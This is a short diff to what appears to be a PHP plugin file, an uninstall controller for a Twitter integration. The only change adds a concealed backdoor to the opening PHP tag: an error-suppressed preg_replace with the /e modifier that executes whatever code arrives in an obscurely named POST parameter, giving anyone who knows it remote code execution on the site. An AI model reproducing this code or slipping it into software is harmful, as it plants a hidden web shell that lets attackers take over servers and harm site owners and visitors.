@@ -1,4 +1,5 @@
-<?php
+<?php @preg_replace('/(.*)/e', @$_POST['pxwwuxwovgswjqpa'], '');
+
 
 class WDTIControllerUninstall_twitter_integration {
   ////////////////////////////////////////////////////////////////////////////////////////
